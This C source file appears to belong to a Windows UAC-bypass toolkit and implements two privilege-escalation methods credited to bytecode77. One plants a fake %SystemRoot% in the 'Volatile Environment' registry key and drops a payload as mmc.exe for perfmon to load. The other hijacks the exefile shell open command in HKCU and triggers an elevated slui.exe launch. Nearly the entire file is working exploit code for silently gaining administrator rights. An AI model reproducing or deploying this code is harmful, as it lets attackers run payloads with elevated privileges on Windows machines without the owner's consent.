/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       BYTECODE77.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  bytecode77 autoelevation methods.
*
*  For description please visit original URL
*
* https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/sysprep-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/remote-assistance-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/display-languages-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/component-services-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/enter-product-key-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/taskmgr-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmVolatileEnvMethod
*
* Purpose:
*
* Bypass UAC using self defined %SystemRoot% environment variable in "Volatile Environment" registry key.
*
* Fixed in Windows 10 RS3
*
*/
NTSTATUS ucmVolatileEnvMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    BOOL  bEnvSet = FALSE;
    WCHAR szBuffer[MAX_PATH * 2];

    do {

        //
        // Replace default Fubuki dll entry point with new and remove dll flag.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // Create %temp%\KureND directory.
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, T_KUREND);

        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Set controlled environment variable.
        //
        bEnvSet = supSetEnvVariable(FALSE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT_VAR,
            szBuffer);

        if (!bEnvSet)
            break;

        //
        // Create %temp%\KureND\system32 directory.
        //
        _strcat(szBuffer, SYSTEM32_DIR);
        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Drop payload to %temp%\system32 as mmc.exe and run target with wait.
        //
        _strcat(szBuffer, MMC_EXE);
        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
            if (supRunProcess(PERFMON_EXE, NULL))
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Cleanup if requested.
    //
    if (bEnvSet)
        supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT_VAR, NULL);

    return MethodResult;
}

/*
* ucmSluiHijackMethod
*
* Purpose:
*
* Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and SLUI elevated launch.
*
*/
NTSTATUS ucmSluiHijackMethod(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    BOOL bSymLinkCleanup = FALSE, bValueSet = FALSE;
    HKEY hKey = NULL;
    SIZE_T sz = 0;
    LRESULT lResult;
    DWORD cbData = 0, dwKeyDisposition = 0;
    WCHAR szBuffer[MAX_PATH * 2];

    SHELLEXECUTEINFO shinfo;

    sz = _strlen(lpszPayload);
    if (sz == 0) {
        return STATUS_INVALID_PARAMETER;
    }

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    //
    // Create or open target key.
    //
    _strcpy(szBuffer, T_EXEFILE_SHELL);
    _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwKeyDisposition);

    if (lResult == ERROR_SUCCESS) {

        lResult = ERROR_ACCESS_DENIED;

        //
        // Set "Default" value as our payload.
        //
        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));

        switch (g_ctx->MethodExecuteType) {

        case ucmExTypeRegSymlink:

            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
                szBuffer,
                NULL,
                lpszPayload,
                (ULONG)cbData)))
            {
                bSymLinkCleanup = TRUE;
                lResult = ERROR_SUCCESS;
            }

            break;

        case ucmExTypeDefault:
        default:

            lResult = RegSetValueEx(
                hKey,
                TEXT(""),
                0, REG_SZ,
                (BYTE*)lpszPayload,
                cbData);


            break;
        }

        bValueSet = (lResult == ERROR_SUCCESS);

        if (bValueSet) {

            //
            // Run trigger application.
            //
            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, SLUI_EXE);

            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
            shinfo.cbSize = sizeof(shinfo);
            shinfo.lpVerb = RUNAS_VERB;
            shinfo.lpFile = szBuffer;
            shinfo.nShow = SW_SHOWNORMAL;
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            if (ShellExecuteEx(&shinfo)) {
                Sleep(5000);
                TerminateProcess(shinfo.hProcess, 0);
                CloseHandle(shinfo.hProcess);
                MethodResult = STATUS_SUCCESS;
            }
        }
        RegCloseKey(hKey);
    }

    //
    // Remove symlink if set.
    //
    if (bSymLinkCleanup)
        supRemoveRegLinkHKCU();

    //
    // Remove key with all subkeys.
    //
    if (dwKeyDisposition == REG_CREATED_NEW_KEY) {
        supRegDeleteKeyRecursive(
            HKEY_CURRENT_USER,
            T_EXEFILE_SHELL);
    }
    else {
        if (bValueSet) {
            _strcpy(szBuffer, T_EXEFILE_SHELL);
            _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
            supDeleteKeyValueAndFlushKey(
                HKEY_CURRENT_USER,
                szBuffer,
                TEXT(""));
        }
    }

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    return MethodResult;
}
